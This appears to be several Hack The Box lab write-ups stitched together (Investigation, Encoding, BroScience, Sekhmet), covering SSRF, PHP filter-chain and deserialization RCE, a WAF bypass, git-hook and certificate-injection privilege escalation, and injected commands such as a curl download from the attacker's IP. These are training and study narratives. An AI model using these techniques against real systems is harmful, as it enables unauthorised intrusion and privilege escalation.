The first two match with users above, but the last one looks like a password, as if someone typed their password into the username field. This could happen when a user walks up to their computer and starts typing their password thinking they are going to unlock the computer, but they aren’t logged in for some reason.
That password works for smorton over SSH:
The user flag is now available:

Category: Shell as root
smorton can run /usr/bin/binary as root:
In fact, only root can run this:
Running it just prints “Exiting…”:
I’ll download a copy of the binary over scp:
I’ll open it in Ghidra and take a look. All the action is in main. main has two arguments, argc which is the number of command line args, and argv, which is a pointer to the array of arguments. I’ll rename and retype those, as well as the other variables in the decompile.
The code starts by checking that there are two args (three counting the program name) and that the current user is root, exiting if either check fails:
Then it verifies that the second arg is the string “lDnxUysaQn”:
It opens that as a file for writing:
Next is uses curl to make a web request:
First it sets the URL (0x2712) to the first argument from the command line. Then it sets the output file (0x2711) to the filehandle from the lDnxUysaQn file. 0x2d sets verbose to true, and then it executes the curl command.
If the curl is successful, it does the following:
This code is taking a weird route to building a command string that looks like perl ./[arg2]. It’s running whatever was downloaded with perl. Then it cleans up, including removing that file, and returns.
This file doesn’t make a lot of sense unless I view it as a piece of malware that’s under analysis by this forensics firm.
To get a shell, I’ll write a simple Perl reverse shell (based on revshells.com):
Now I simply host that on a Python webserver run binary with the URL pointing to it:
It fetches from my server:
And there’s a connection at nc:
And I can read root.txt:
Ippsec pointed out to me that perl script.sh will respect the shebang line of the script. So if script.sh starts with #!/bin/bash, perl will pass that off to bash for execution. That means that I can create shell.sh that will create a SetUID copy of bash:
Running this the same way works:
It’s also possible to exploit a race condition to abuse this binary. It gets the binary and writes the file, then does some calculations of string length and builds a string, and then calls system to run that string. Between the curl and the system calls, because it’s saving in the current directory, if that directory is one that my current user owns, I can move files even if I don’t own them and can’t write to them.
To illustrate this, I’ll listen with nc on 80 rather than a Python webserver. When I run the binary, it connects, leaving it in a hung state waiting for the server to respond. At this point, the output file exists and is empty:
I can’t write to it, but I can move it:
To abuse this, I’ll create a script I want to get to run:
Now I’ll get two shells on Investigation. In the first, I’ll run an infinite loop:
This checks for the existence of lDnxUysaQn, and if it’s there, moves it to garbage and copies 0xdf.sh over it. Then it sleeps for a second and removes the file.
Now when I run binary, it doesn’t matter what’s in the file, but it has to exist (so that curl returns success and the file is executed). When I run this:
It may not trigger every time, but it was most for me. Because it’s waiting for the file to appear, the timing works out that it moves it just at the right time.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 28 Jan 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 22.04 jammy.
The site is called HaxTables:
It describes itself as:
Free online String and Number converter. Just load  your input  and they will automatically get converted to selected  format.  A collection of useful utilities for working with String and  Integer values. All are simple, free and easy to use. There are no ads,  popups or other garbage!
The “About us” link doesn’t go anywhere. The “Convertions” is a drop-down menu:
The “Images” link just leads to a page that says “Coming soon!”. The “String” and “Integer” links lead to very similar pages that take some input text and allow the user to select a conversion:
It does what would be expected:
The “API” link have a page with a bunch of examples for interacting with the API at api.haxtables.htb:
The examples are all Python examples using the Requests module to interact with the endpoints.
The URLs show that this page is written in PHP. In fact, it’s using a common PHP pattern, where each page is of the form http://10.10.11.198/index.php?page=api. If page=string, it loads the string conversions page. Similarly with page=integer and page=image.
index.php is almost certainly taking the page parameter manipulating it by filtering, prepending a path, and appending .php.
Sometimes it’s possible to access these files directly by visiting something like http://10.10.11.198/image.php, but it returns 404 not found. /includes.image.php also is 404. It turns out the page is /includes/image.html and that is accessible, but it’s not important to know that.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
Nothing new or interesting here.
Before version 2.9.3 of feroxbuster, I’ll need to explicitly filter 404 and 403 to get rid of a ton of noise (-C 403,404). It turns out that non-existent pages ending in .php return different 404 pages (9 lines) than non-existent pages without an extension (1 line), so the auto filtering doesn’t filter the .php 404s. Within a day of tipping off epi, the v2.9.3 release fixed the autofilter!
When I click submit on one of the forms, there’s JavaScript in the page that sends a request to /handler.php. The JavaScript invoked is the make_req function:
This generates a POST request to /handler.php that looks like:
I’ll note that a path is being sent in the request as something I might mess with.
Given the use of api.haxtables.htb, I’ll brute force for any additional subdomains that may be in use. Originally I’ll start it without a filter, and notice that the default case is 1999 characters:
The default case seems to be 1999 characters, so running with --hh 1999 will hide those responses and show anything different:
It finds one more, image.haxtables.htb. I’lll add all of these to my /etc/hosts file:
Visiting http://image.haxtables.htb returns an Apache 403 Forbidden page.
feroxbuster doesn’t find anything.
This seems like a dead end for now. It could be filtering based on my IP, or I might need to know a path on the virtual host. Either way, once I get a shell or a way to make requests from the host I’ll come back.
The root api.haxtables.htb returns an empty response. However, the API page on the main site has documentation about the API. This is not a very realistic looking API, but perhaps it fits the toy website on this box.
The documentation gives the following endpoints:
Both endpoints can also handle requests sent as form data and with a file_url instead of the data to be encoded.
I went down a bit of a rabbit hole looking at the form data - This section isn’t important for solving the box.
The example uses both data :
files in a requests request tells it to send it as multipart form data. The HTTP request will define a boundary in the Content-Type header, and then have sections divided by that boundary string, each with some metadata and then the data.
In this example, for some reason they put part of it in as data and part as files. requests will combine data and files and handle them all like files (though the action doesn’t get a filename metadata entry):
This is weird, but not important for solving the box.
The last example shows giving a URL instead of data:
I’ll create a simple text file named test.txt and host it with a Python webserver. I’ll send the URL for that file to this endpoint:
It works. It gets a 200 response. There is also a hit on my webserver:
The response body shows the returned data, hex-encoded:
I’ll use xxd to verify this is the same data:
I’ll run feroxbuster on this site as well. I typically run with -m GET,POST for APIs, but it doesn’t show anything additional here, so for the sake of cleanliness, I’ll show just GET requests. I also typically wouldn’t include an extension for an API, but I’ve already seen this one has .php extensions:
One thing that immediately jumped out is that not only /v3, but /v1 and /v2 seem to exist with the same endpoints. This is really just a rabbit hole.

Category: Shell as www-data
I’m curious to see how the PHP server is making the request to get the file from a given URL. I’ll use nc to listen on 80 and get it to make the same request to me again:
No User-Agent string.
I wasn’t able to read anything from image.haxtables.htb from my host. It’s worth trying to see if I can reach it via the website functionality. If I can exploit anything there, that would be a server-side request forgery (SSRF).
Unfortunately, it replies that http://127.0.0.1/index.php is an “Unacceptable URL”:
I’ll check http://image.haxtables.htb as well, with the same result:
It turns out there’s a bypass here, which I only discovered after solving and chatting about the box with IppSec. I’ll talk about that in Beyond Root.
Given that the site is parsing URLs, I’ll try the file:// scheme to see if it can read files from disk. It can!
That decodes to “encoding”, which makes sense as the hostname:
I’m going to make a Flask proxy to make reading from the file system easy. I’ll walk through that in this video:
The final script is here:
When I run it, it listens on port 5000 such that I can do things like this in another terminal:
With the proxy in place, I’ll start reading files from the filesystem. I’ll see if I can pull the config for Apache, which is by default at /etc/apache2/sites-enabled/000-default.conf. It defines three virtual hosts.
The first is the default, with a web root at /var/www/html:
The second is for the API host, with a root at /var/www/api:
The third is for image, which is rooted at /var/www/image:
This server has a bit more defined. The last section sets it so that any host except for localhost is blocked trying to access this server.
The main site index.html has the HTML for the nav bar, and then in the main body has this PHP:
This is a safe include, as it only includes specific pages.
I noted above that conversions were handled by handler.php:
This file organizes the user input and passes it to make_api_call, which is defined in the included /var/www/api/utils.php. The function uses curl to make a request at api.haxtables.htb:
So the page uses JavaScript to hit another page on the main site, and that site uses PHP to issue a request to the API. The response is passed back to the PHP page and then packaged to send to the user. This is a very odd site flow.
There’s also an SSRF vulnerability in this page which I’ll show below.
The index.php on image.haxtables.htb is very simple:
The HTML page is just static. utils.php has a bunch of functions. get_url_content is using curl to get files from a URL:
The gethostbyname check is what blocks me from accessing localhost or 127.0.0.1 or image.haxtables.htb (I’ll show why this fails in Beyond Root).
Three functions at the bottom are interacting with git:
The first thing to look at is the shell_exec calls, but it seems that no user input is used to form the commands, so there’s not command execution there. It is interesting to note for later that the user running the webserver is able to run sudo as svc for these commands without a password. I’ll come back to git-commit.sh as well.
This script also suggests there is a Git repository here.
It’s there.
The author’s intended path is to rebuild the repo manually using the file read vulnerability. This man page shows the layout of a Git repo. I’ll start in an empty directory initializing the repo:
I’ll add config and HEAD:
Knowing the HEAD, I’ll fetch the file in refs/heads/[branch name] that will give the “tip-of-the-tree” commit:
I’m using tee to both see the contents of the file and save the file into my repo. The commit is a SHA1 hash, and the associated objects will be in .git/objects/[first two char of sha1]/[rest of sha1]:
The results are not obvious. That’s because they are zlib compressed. That article shows up to decompress them with Python:
Alternatively, there’s a git subcommand, cat-file (docs, that will do this:
This object is built with a reference to another object, 30617cae3686895c80152d93a0568e3d0b6a0c49. I’ll need to get that on into place using the same method:
This one references more trees and blobs. If I try a git status right now, it complains that the top tree item is missing:
I’ll download the file as before, then run git status to see if anything is missing, and after a handful more, I get:
That’s saying that the repo shows those files in the last commit, but they are not on disk now, so it’s showing them as deleted.
Running git reset --hard shows a few more missing objects:
Once I download those, it works:
One of the reasons I wrote the Proxy the way I did was so that I could just use a tool like git-dumper to download the repo. It’ll make requests to http://localhost:5000/var/www/image/.git/ and the results will be the files it needs, as if they were hosted on that host. The only trick is that git-dumper is a bit picky about the content-type response header, so I had to make sure to set that in the proxy.
For some reason, I get an error having to do with downloading the all 0 object (seems like an error), and it says it’s corrupt, but it works fine for my purposes:
After filtering out the files in .git, only a handful remain:
I’ve already looked at index.php and utils.php. git-commit.sh involves committing to the local Git repo and is invoked via the API. I’ll come back to this script later, but for now, I’ll just say that I cannot conceive of a reason why someone would want this functionality in an API.
The actions directory has two files in it. image2pdf.php is empty. It’s not clear at this time if that’s an issue with how the repo was reconstructed or if it’s truly empty, but it is empty in both the git-dumper and manually reconstructed repo (once I get a shell I can confirm it’s empty on Encoding as well).
action_handler.php seems like it’s the start of a new main page:
It doesn’t really do much yet, but it has an obvious file include vulnerability, as the user controls the page parameter.
The intended way to exploit this box was through an SSRF in haxtables.htb. There’s a shortcut I’ll show in Beyond Root.
RFC 3986 Appendix-A shows the format of a URI. Pulling out the parts that matter here:
So a URL can look like:
For this case, scheme is http. authority is the host, but it can have an optional :[port] after it, and an optional [userinfo]@ before it. path-abempty is either empty or starts with /.
In the make_api_call function, it takes user input to build a URL that is passed to curl:
It’s clear that this can be any path on api.haxtables.htb that ends with /index.php. But because there’s no / between .htb and the user input, I can actually use this to reach other servers as well by adding an @ symbol.
If I send @10.10.14.6 as the $uri_path, then $url will be:
I’ll send the POST request to haxtables.htb/handler.php into Burp Repeater and update the uri_path:
I’ll start nc listening on 80 and on sending the above request, there’s a request at nc from Encoding:
Rather than sending to api.haxtables.htb, it’s hit my server. The Authorization header has base64 data that decodes to that userinfo:
It used to be that to take an local file include (LFI) to remote code execution (RCE), you needed to get malicious PHP code into a file on the server somewhere, by abusing an unsafe file upload or something like log poisoning.
Then came PHP filter injection, explained in detail in this Synacktiv post, perhaps first published in this CTF writeup. I went into this technique in the Beyond Root for UpDown and made this video showing it in detail:
The summary is that by stacking many PHP filters encoding and re-encoding a temporary empty file over and over, eventually I can actually add legit PHP that gets included and executed.
This repo has a Python script to generate the filters necessary to inject PHP code into a page. To test, I’ll try to generate a PHP filters to run phpinfo():
I’m going to use the SSRF to hit image.haxtables.htb/actions/action_handler.php with a page parameter of the filters above. /index.php will be appended to the end, but that doesn’t matter, as php://temp/index.php will be a valid PHP temp file.
When I put this into Repeater, it works:
I’ll generate another filter chain, this time with a Bash reverse shell:
I’ll replace the filters in Repeater, and start nc listening. On sending, I get a shell as www-data:
I’ll upgrade the shell with the script / stty trick:

Category: Shell as svc
I noticed that the website was running sudo to run git commands in the script. That is visible with sudo -l:
git-commit.sh checks for files that different from the previous commit. If there are files, it adds them. If not, it commits the current changes.
Within the image directory, the only place I can write is in the .git folder. At first it looks like I www-data wouldn’t be able to write:
The + means there are extended attributes:
www-data has read, write, and execute. There’s no where else in image that www-data can write:
With write access to the .git folder, I have access to mess with a lot of configuration for the repo. With the sudo configuration, I can add and commit files to the repo. There are probably many ways to get execution from this setup.
One way is to use a post-commit hook, which is a script that runs when files are committed. To commit, I’ll need modified files. Typically files are only added to the repo from within the directory containing the .git directory (and any subfolders). I’ll modify git to allow files from other locations, and then trigger the commit using the script.
This echo line pipped into tee will write a bash script to .git/hooks/post-commit:
I’ll also set it executable. This script writes a public SSH key into svc’s authorized_keys file.
In order to commit, I’ll need to have some changes in the repo. Changes in the .git folder do not count, as that’s metadata about the repo.
The --work-tree argument allows me to specify a directory to consider part of the repo. I’ll add /etc/hostname:
Not it shows up as new and deleted (which is a bit weird, but I’m doing weird things with git).
sudo and the script will commit to the repo now since there are changes to be committed.
It works, and I can SSH as svc:
And get the user flag:
There’s also a SSH key in the user’s home directory which I can grab for future use (if I overwrite the previous authorized_keys I’ll need to re-add id_rsa.pub):

Category: Shell as root
svc can run restart services as root using systemctl:
Services are defined in files in /etc/systemd:
svc can’t write directly in systemd:
Nor in the subfolders, except system has extended attributes:
svc can’t read, but can write to system:
As www-data can, I can still see what’s in this directory:
The .wants files define which services the service relies on so that it can start in the right order on boot. The .service files define a service. For example, pm2-root.service:
It sets up the user, the environment, and the commands that run on start, reload, and stop.
svc can edit files like pm2-root.service, but that risks taking down the webserver for the box. I’ll make my own. ChatGPT will give me a quick template:
I’ll use vim as svc to write the service:
As www-data I’ll verify it’s correct:
/tmp/0xdf will look very similar to the git hook from earlier:
And I’ll make sure to chmod +x /tmp/0xdf.
Now I’ll restart the service, and script_ran is now present on the box:
That’s a good indication that the script executed as root.
SSH works as well:
And I can get root.txt:
When I was talking to IppSec about how I solved this, he was surprised I used handler.php to get the SSRF working. “Why didn’t you just use the file_url argument in /v3/tools/string/index.php?” he asked.
But I tried that above! It didn’t work. On comparing notes, the difference was this: my URL started with http://, and his didn’t!
I’ll play around with this in this video):
The summary is that PHP’s parse_url function, despite it’s claim that “Partial and invalid URLs are also accepted, parse_url() tries its best to parse them correctly”, fails when the scheme is missing entirely, and returns nothing:
That means that this check works as expected with http://image.haxtables.htb, but is bypassed when given image.haxtables.htb:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 07 Jan 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.087s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  httpsCategory: Recon
nmap finds three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):
Based on the OpenSSH) and Apache versions, the host is likely running Debian 11 bullseye.
The port 80 HTTP service is returning a redirect to https://broscience.htb.
Given the use of the domain names, I’ll fuzz both 80 and 443 with wfuzz to see if any subdomains return different pages, but it doesn’t find anything.
The website has a bunch of articles about weighlifting:
Clicking on one of the articles leads to a url like https://broscience.htb/exercise.php?id=2, and gives a page with a comment section:
Trying to post a comment leads to the log in page (login.php). There is a registration link, but when I register, the message indicates that I need to activate:
If I try to log in anyway, it errors:
The HTTP headers show Apache:
Visiting the site shows it’s a PHP site based on file extensions. There are some JavaScript and CSS packages, but nothing that looks like a framework.
Looking at the page source, I’ll note that images are loaded via an odd PHP path, rather than directly to the static files:
Immediately on visiting the site, there is a PHPSESSID cookie set:
That is a standard PHP cookie.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP. There’s a ton of folders and things that don’t look interesting, so I’ll kill and restart with --no-recursion, and even there, there’s a lot:
I’ve cut off a bunch of meaningless 403s for paths that start with a .. Of interest here is activate.php.

Category: Shell as www-data
Visiting /includes/img.php returns a page saying that the path parameter is missing:
If I try to visit anything with ../ in the path, it just returns “Attack detected”:
There’s a really nice traversal wordlist here that will try all sorts of tests. I’ll use wfuzz (I can’t use ffuf until this bug is fixed) to try all these, filtering out any response with the string “Attack” and any with 0 size:
These six requests seem to return data. I’ll try one in Firefox:
These payloads seem to bypass the filter by double URL-encoding the / in ../. The first URL encode takes / –> %2f. The next URL encode (just of the %) takes % –> %25, making the entire ../ into ..%252f. Decoing this once will give ..%2f, and then again will give ../.
../index.php pull the source for the main site. In the header, there’s references to /includes/header.php and /includes/utils.php:
Next the body has some setup, and the connection to the database:
Next there’s a query to the DB for exercises, and a loop to create an article for each result:
From the code above, I’ll check out a few files in the /includes directory. path=..%252fincludes/db_connect.php returns the DB information including password:
/includes/utils.php has a bunch of functions. At the top there’s a function to generate activation codes:
It’s seeding the pseudo-random number generator with time(), which is suspect, and likely exploitable.
There’s a get_theme function that is designed to read user preferences from a cookie:
I’m particularly interested in this because it takes the user-prefs cookie, base64 decodes it, and passes it to unserialize, which could lead to a PHP deserialization vulnerability. But that’s only if the session is set, which means I need to log in first.
There’s also an Avatar class at the bottom of the file:
This jumps out as interesting because of the __wakeup() method, which is a Magic Method in PHP. Specifically:
unserialize() checks for the presence of a function with the magic name __wakeup(). If present, this function can reconstruct any resources that the object may have.
So if I can get the system to unserialize an AvatarInterface object, it will run the __wakeup function, which calls the save function which writes a file.  There’s potential here to make one of these and put it into a user-prefs cookie to get file write. I’ll come back to this.
path=..%252factivate.php reads this file. The important part is that it looks for a GET parameter named code:
I’ll find my request to register in Burp and take a look. It’s a POST to /register.php:
The response headers include the time on the server:
I’ll write a short PHP script that will generate codes. If I just make some PHP that prints time(), I’ll see it comes out as an epoch timestamp:
strtotime will give that same output from the time string in the request:
I’ll pull in the generate_activation_code function collected earlier, modifying it to take an argument, and seeding srand with that argument instead of time():
This will print activation codes from 30 seconds before and 30 seconds after the timestamp of when I registered (more than necessary).
I’ll save these to a file, and then run them through wfuzz to try them all:
I’m using --hs Invalid because the string “Invalid” is present when the code is wrong. I don’t really care what the code was, just that it worked.
Now when I log in, it works:
On logging in, it sets another cookie, user-prefs:
This matches the cookie I saw deserialized in the code. Replacing %3d with = (URL decode), this base64 decodes to:
That’s a PHP serialized object.
I’m going to grab a lot of the PHP code from utils.php and use it to generate a serialized object.
The Avatar and AvatarInterface classes are unchanged (not shown). I’ll create a new AvatarInterface instance, and set the $tmp and $imgPath parameters. I’ll then serialize and base64 encode the result, and write that out.
So what are the $tmp and $imgPath values? When unserialize is called on this cookie, it will call the __wakeup function of AvatarInterface, creating a new Avatar with an $imgPath I give. Then it will call save with $tmp. save uses file_get_contents to read the contents of a file at the path $tmp, and writes that to $imgPath.
Since I want to write a webshell, I’ll want to write to the webroot. Something like ./cmd.php will work fine.
Getting a webshell is a bit tricker. There are a couple ways I could go about it. The intended path for the box is to change my username to include a webshell, and then reference my session file at //var/lib/php/sessions/sess_[session id].
But file_get_contents will also read over the network. So I’ll set it to a URL such as http://10.10.14.6/cmd.php.
My final code is:
Running this gives a cookie:
I’ll make a simple webshell called cmd.php and host it on my webserver with Python:
I’ll go into Firefox dev tools and replace my cookie with the malicious one, and refresh https://broscience.htb. There’s a connection at the webserver (actually three):
And /cmd.php exists on the webserver, and it works:
I’ll type out a bash reverse shell into Firefox, URL encoding the & to %26:
On hitting enter, there’s a shell at my listening nc:
I’ll upgrade the shell:

Category: Shell as bill
There’s one user with a home directory on the box, bill, and it has user.txt, but I can’t read it yet:
I already had access to most of the web files. But now I can connect to the database with the creds from db_connect.php:
It’s Postgres, so I’ll use psql to connect, entering the password when prompted:
broscience is the only interesting accessible database:
It has three tables:
The users table has five users besides the account I created:
The password for the 0xdf user is “0xdf”, and the hash looks like an MD5 (just based on length). But just taking an MD5 of “0xdf” doesn’t match:
I’ll look at registration.php, and these two lines are where the account is created and inserted into the DB:
The password is md5($db_salt . $_POST['password']). The same thing can be observed in login.php:
$db_salt is defined in db_connect.php:
Appending the salt does give a matching hash for 0xdf’s password:
hashcat has a mode where it will read in hash and salt separated by :. I’ll use || in postgres to append strings together to generate an easily copyable list:
I’ll pass that file to hashcat and let it try to recognize the hash format. The --user flag tells hashcat to split off the string before the first : as the username. It finds a bunch of possible hash formats, and prints a table of them, asking me to re-run specifying which mode to use:
Mode 20, md5($salt.$pass) looks like this case. It cracks three of them:
Running with --show instead of a wordlist will show the results with the usernames:
bill is a user on the box, and the list above has a password for bill. Running su with that password works to get a shell as bill:
And gives access to user.txt:
The password also works for SSH:

Category: Shell as root
There’s not much else on this box to look at. bill’s home directory is basically empty. Another review of the web code doesn’t give much.
bill cannot run sudo:
I don’t see any unusual SetUID / SetGID binaries.
Turning to the running processes, ps auxww doesn’t reveal anything too interesting. I’ll upload pspy to look for crons that might be running:
It looks like every two minutes there’s a cron.sh script that runs as root (UID=0):
It seems to run /opt/renew_cert.sh on /home/bill/Certs/broscience.crt.  The Certs directory does exist in bill’s home directory, but it’s empty.
This shell script starts by checking the usage and running help if necessary:
Then there’s a check that the argument is a file that exists ([ -f $1 ]), and if not, it prints a message and exits. When it is a file, it runs openssl on the file:
If the input certificate expires in more than 86400 seconds (a day), it will return 0. If it retires sooner than that (or if there’s bad input), it will return 1, and continue. This article shows this in practice.
On continuing, the script will parse out variables from the existing certificate:
After printing all of this to the screen, it will use it to generate a new certificate:
The very last line above is the important one. There is a command injection vulnerability in that line if I can control $commonName. Working backwards, $commonName is set here:
This is printing whatever $commonName was set as, starting from the sixth character, and then printing up to the first ,.
Before that, $commonName is set based on $subject:
I believe the author is trying to get from CN = up through the next comma or the end of the line, but the way this regex is written, because .* is greedy, it will just always take through the end of the line. For example:
$subject comes from an openssl command output reading the certificate:
Effectively, if I can put a command injection payload into a certificate, and have it expire in less than one day, this script will execute it.
ChatGPT will quickly give me the openssl syntax to make a certificate. I’ll modify it slightly to meet my needs:
My payload will copy bash into /tmp and set it as SetUID to run as root (I originally tried /dev/shm, but it is mounted nosuid.
After two minutes, there’s a SetUID binary in /tmp:
I’ll run that with -p to not drop privs and get a shell as root:
And read the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 10 Sep 2022
OS : Windows
Base Points : Insane [50]
Nmap scan:
Host is up (0.086s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye. This is interesting given that HTB shows Sekhmet as a Windows box. Probably VM or container.
Visiting the site returns a redirect to www.windcorp.htb. Given the use of domains, I’ll use ffuf to fuzz for any other subdomains that respond differently. I use -ac to filter automatically, and -mc all to make sure I get any HTTP response codes:
It finds portal.windcorp.htb immediately. I’ll update my /etc/hosts file to include:
I’ll also make sure to comment out any lines from Hathor and Anubis, both of which used windcorp.htb.
The site is for a website creation / graphic design company:
There’s an email address right at the top, contact@windcorp.htb. There are some names of employees, but nothing that looks like a username.
The HTTP headers show NGINX, but not much else:
The 404 page is the default NGINX 404:
This could be just NGINX hosting a static site.
I’ll run feroxbuster against the site:
It returns a lot! I’ll let it run in the background, but it also makes the site really slow, so I’ll eventually conclude that there’s nothing really interesting here and kill it. A bunch of the identified information is 403s on files in /assets, which isn’t interesting.
The site presents a login page:
While just trying creds to see what the request looks like, I tried admin / admin and it worked! The next page doesn’t offer much:
The “About” link goes to /about but nothing interesting:
The HTTP response headers on portal show that it’s Express:
Visiting any url path on this host seems to return the login page as a 200 OK (no redirect). That’s a bit odd, and will make brute forcing paths with something like feroxbuster a bit odd (I turn out not to need this).
When I log in, the response sets a cookie:

Category: Shell as webster on webserver
The cookie is base64 data:
I can edit the cookie to change the username or admin status, but there’s not much point, as I’m already admin with admin true.
This post does a nice overview of how to abuse deserialization in NodeJS / Express. I’ve actually cited this exactly post twice before, in Celestial and Nodeblog. The unserialize function in NodeJS is not meant to accept user-controlled data, and can be exploited to get code execution. The post author generates this example payload:
I’ll modify that payload to ping my server:
Base64-encoding gives this, which I’ll set as my cookie:
I’ll set that as my cookie in Firefox with the dev tools, and refresh the page. I don’t get pings, and the page shows I’ve been blocked by ModSecurity:
The post shows a way to encode a reverse shell as a series of int that get passed to eval(String.fromCharCode()), but this is blocked as well.
I want to figure out what’s getting blocked by the web application firewall (WAF). I’ll start removing parts of the (pre-base64-encoded cookie) and sending to see where it stops returning 403 Forbidden. {"rce":"_$$ND_FUNC$$_ still returns 403 Forbidden, but {"rce":"_$$ND_FUNC$$ returns a 500 Internal Server Error. The error isn’t surprising, as the malformed cookie will crash things. Still, it isn’t being flagged by the WAF
There are many ways to bypass WAFs. One thing to try is different encodings. One that works here is encoding some bytes in unicode. Replacing one of the $ with \u0024 makes:
This is returns a 500 error! That’s bypassing the WAF (though it’s not clear yet that the server handles it correctly).
I’ll start rebuilding the cookie a bit at a time, and when I get up to this, it triggers the WAF again:
Encoding the { as \u007b:
Encoding this and sending it doesn’t return 500, but 200, with an ICMP echo request at my listening tcpdump:
That’s RCE!
The rule that is likely blocking these request is one of the core rules, found here. The comments specifically call out these strings as one’s they are looking for:
The regex on line 52 also includes something for _$$ND_FUNC$$_:
This rule has a series of transforms to check the data on line 57:
This one include urlDecodeUni, but the one on Sekhmet is an older version that doesn’t.
I’ll replace the ping with a bash reverse shell:
On encoding, putting into Repeater as the cookie, and submitting, a shell connects to my listening nc:
I’ll do a shell upgrade:

Category: Shell as root on webserver
The only home directory on this Linux box (webserver) is webster, and it has a single backup file:
I’ll exfil that to my host for further analysis (making sure to check the hashes are the same).
Looking at the running processes, the machine is running sssd:
sssd is an open source client for connecting a Linux machine into Active Directory. sssd data are stored in /var/lib/sss, but I can’t access anything valuable as webster:
There’s also config data in /etc/sssd, but I can’t access that either:
The /etc/krb5.conf file does show information about the domain:
The DC is named hope.windcorp.htb.
If it’s not clear from the fact that the shell is in a Linux VM on a Windows target, the IP address of 192.168.0.100 shows that I’m in a VM or container:
I can ping the DC at .2:
Nothing else in the network responds to a ping sweep:
I can explore connections with the DC, but first I’m going to work on this zip backup.
Trying to unzip this shows it needs a password:
I can try to brute force the password, but without luck.
7z l -slt will show metadata about each file / folder in the archive. On this one, it shows all of the files are encrypted with ZipCrypto:
There’s a known plaintext attack on ZipCrypto. I showed this before on Ransom.
I need to know plaintext of one of the files in the archive. Luckily for me, /etc/passwd is in the archive. Also, it gives the CRC32 for the file above as “D00EEE74”. I can verify this matches the current passwd file using using Python3:
It’s match. I’ll exfil a copy of /etc/passwd to my host.
To attack this, I’ll use bkcrack (from here). I’ll need an unencrypted zip with passwd in it:
I’ll run bkcrack giving it:
It finds keys:
To use the keys, I’ll call bkcrack again, this time with:
This one runs quickly:
This creates a new zip with the know password. I can decrypt:
In /var/lib/sss/db there’s a .ldb file that holds all the AD information, cache_windcorp.htb.ldb. The file is a TDB file:
strings can get the info I need from this file, but tdbdump will do it a bit cleaner (part of the samba suite, apt install samba):
The blob on Ray.Duncan is the largest in the dump, and it contains a hash:
I’ll save that in a file and pass it to hashcat:
The password is “pantera”.
With Ray.Duncan’s password, I can try to get a ticket as that user on the domain with kinit:
It seems to work, and now klist shows the ticket:
ksu is a program that will try to get root privileges using Kerberos / AD as the arbitrator. I can run it to see if Ray.Duncan can escalate, and they can:
user.txt is in /root:
To solidify my access, I’ll drop my public key into root’s authorized_keys file:
I’m able to connect as root to the VM now:

Category: Shell as Bob.Wood on Sekhmet
I’ll download a static compiled nmap from this GitHub repo and upload it to webserver with scp. Now I can scan the DC to see what ports are open:
This looks like a very standard DC. WinRM (5985) is open, which is worth nothing if I get more creds.
Because I have a Kerberos ticket (or can generate a new one running as root), I can try to connect to SMB and other services on the DC. Because smbclient isn’t on webserver, I’ll create a tunnel using my SSH connect. I’ll hit enter a couple times, then ~C to drop into the SSH shell. -D 1080 will open a SOCKS tunnel on my host on TCP 1080 that will forward through the SSH connection:
To get auth on my server, I need to set up Kerberos to get a ticket through the proxy. I’ll edit my /etc/krb5.conf file to be:
Case matters here! Now I can kinit from my host:
If DNS is having trouble getting through the proxy, I’ll disable that in /etc/proxychains.conf and add hope.windcorp.htb to my /etc/hosts file as 192.168.0.2.
Now I can enumeration SMB just like I would on a fresh box, but I’ll add -k to use Kerberos auth. There are six shares, five of which are standard on a DC:
WC-Share is unique to this domain, so I’ll connect to that:
It has a single folder, temp:
That has a single file, debug-users.txt:
The file has four potential usernames:
I’ll notice that RayDuncan is in the list.
I’ll also check the other shares. NETLOGON typically holds logon scripts and other files.
I’ll download all three files:
form.ps1 generates a GUI form that amobile attribute in the LDAP data. There’s a bunch of GUI generation, and at the end:
It’s not clear that this is running or anything, but it does point a finger at mobile numbers.
I’ll try modifying Ray Duncan’s mobile attribute in LDAP. I have the full key for the user from the LDB above: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB.
I can make the change with ldapmodify, which is on webserver:
A couple minutes later, the entry for RayDuncan has updates in debug-users.txt:
This next step was a pain. It takes a lot of trial and error, and each time you submit, it takes two full minutes for the cron to run. I set up with a SSH in the lower terminal in my tmux window, and a terminal up top that is running watch. watch will run a given command every X seconds (2 by default) and print the output to the screen, updating whatever changes between runs.
My watch command runs a few commands to:
The full command is watch -n 10 -d "rm debug-users.txt; proxychains smbclient -k //hope.windcorp.htb/WC-Share -c 'get temp/debug-users.txt debug-users.txt'; cat debug-users.txt, and the result is these windows with the top updating every 10 seconds with the contents of debug-users.txt as I update LDAP via the bottom::
I know that changes in the mobile attribute in AD lead to changes in debug-users.txt. There must be some kind of script processing these changes (every two minutes) and writing to a file. I’ll check for command injection by setting ray.duncan’s mobile attribute to $(whoami):
When it updates, the result shows command injection:

Category: Auth as scriptrunner
I’ll check if script running can ping my VM by setting mobile to $(ping 10.10.14.6). When it runs, I get ICMP:
And the results are in debug-users.txt:
I’ll to get a web request back to my host with $(curl 10.10.14.6/d -outfile \programdata\d). It works (I have a dummy file with a string at d on my server):
I’ll update mobile to read that file, and it works:
I’ll serve nc64.exe and upload it. It seems to go fine. However, I’m not able to get it to connect back to me or to a nc listening on webserver. It seems likely that AppLocker is blocking the scriptrunner user from running nc64.exe.
I’ll try to get scriptrunner to connect back to my host over SMB to collect a Net-NTLMv2 hash (really a challenge / response). But it doesn’t work. It could be a firewall, or perhaps that it’s a IP address not on the domain.
